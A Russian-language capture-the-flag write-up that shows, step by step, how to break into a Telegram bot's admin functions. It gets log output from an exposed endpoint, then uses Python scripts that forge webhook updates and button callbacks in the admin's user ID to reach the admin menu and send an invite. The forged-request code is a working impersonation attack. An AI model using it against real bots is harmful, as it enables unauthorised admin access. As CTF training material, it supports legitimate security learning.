Переходим по гифке которую отправил бот (pyrogram для просмотра исходника сообщеия), заходим в корень сайта. Видим 405: Method Not Allowed, пробуем POST, получаем `Use: ?action=<show_nginx_logs|start_ping>`

Делаем POST запрос с action=show_nginx_logs

```python
import httpx
r = httpx.post("https://t-altcapone-r1m0mt9a.spbctf.net?action=show_nginx_logs")
print(r.text)
```

Видим логи:

`[22/Apr/2024:10:55:53 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:55:58 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:03 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:08 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:13 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:18 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:23 +0000] "POST /telegram/webhook HTTP/1.0" 200 46 "-" "Python/3.10 aiohttp/3.8.4"`

`[22/Apr/2024:10:56:28 +0000] "GET /images/mafia.webp HTTP/1.0" 200 350418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) marktext/0.17.1 Chrome/94.0.4606.81 Electron/15.4.0 Safari/537.36"`

Симулируем /admin от имени админа (Меню администратора доступно только @exmafiaguy, id админа получаем с помощью того же pyrogram'а

```python
import httpx
import random
admin_id = 6818118044
text_webhook = {
  "update_id": random.randint(1, 100000),
  "message": {
    "message_id": random.randint(1, 100000),
    "from": {
      "id": admin_id,
      "is_bot": False,
      "first_name": "John",
      "last_name": "Doe",
      "username": "johndoe",
      "language_code": "en"
    },
    "chat": {
      "id": admin_id,
      "first_name": "John",
      "last_name": "Doe",
      "username": "johndoe",
      "type": "private"
    },
    "date": random.randint(1, 100000),
    "text": "/admin"
  }
}
print(httpx.post("https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook", json=text_webhook).text.encode('utf-8').decode('unicode-escape'))
# Вывод: {"chat_id": 6818118044, "text": "Выберите действие", "reply_markup": {"inline_keyboard": [[{"text": "Перезагрузить nginx", "callback_data": "inline_button_restartnginx"}], [{"text": "Атаковать example.org", "callback_data": "inline_button_ddosexample"}], [{"text": "Пинговать google.com", "callback_data": "inline_button_pinggoogle"}], [{"text": "Другие >>", "callback_data": "inline_button_nextpage"}]]}, "method": "sendMessage"

```

Пробуем послать callback_query чтобы перейти на другую страницу

```python
import httpx
import random
admin_id = 6818118044
callback_webhook = {
  "update_id": random.randint(1, 100000),
  "callback_query": {
    "id": random.randint(1, 100000),
    "from": {
      "id": admin_id,
      "is_bot": False,
      "first_name": "prgr",
      "username": "batadase",
      "language_code": "en",
      "is_premium": False
    },
    "chat_instance": "-1024699890573352454",
    "data": "inline_button_nextpage"
  }
}
print(httpx.post("https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook", json=callback_webhook).text.encode('utf-8').decode('unicode-escape'))
# Вывод: {"chat_id": 6818118044, "text": "Выберите действие", "reply_markup": {"inline_keyboard": [[{"text": "Отправить приглашение", "callback_data": "inline_button_sendinvite"}]]}, "method": "sendMessage"}
```

Получилось, присылаем инвайт себе

```python
import httpx
import random
admin_id = 6818118044
text_webhook = {
  "update_id": random.randint(1, 100000),
  "message": {
    "message_id": random.randint(1, 100000),
    "from": {
      "id": admin_id,
      "is_bot": False,
      "first_name": "John",
      "last_name": "Doe",
      "username": "johndoe",
      "language_code": "en"
    },
    "chat": {
      "id": admin_id,
      "first_name": "John",
      "last_name": "Doe",
      "username": "johndoe",
      "type": "private"
    },
    "date": random.randint(1, 100000),
    "text": "549337111"
  }
}
callback_webhook = {
  "update_id": random.randint(1, 100000),
  "callback_query": {
    "id": random.randint(1, 100000),
    "from": {
      "id": admin_id,
      "is_bot": False,
      "first_name": "prgr",
      "username": "batadase",
      "language_code": "en",
      "is_premium": False
    },
    "chat_instance": "-1024699890573352454",
    "data": "inline_button_sendinvite"
  }
}
print(httpx.post("https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook", json=callback_webhook).text.encode('utf-8').decode('unicode-escape'))
print(httpx.post("https://t-altcapone-r1m0mt9a.spbctf.net/telegram/webhook", json=text_webhook).text.encode('utf-8').decode('unicode-escape'))
```
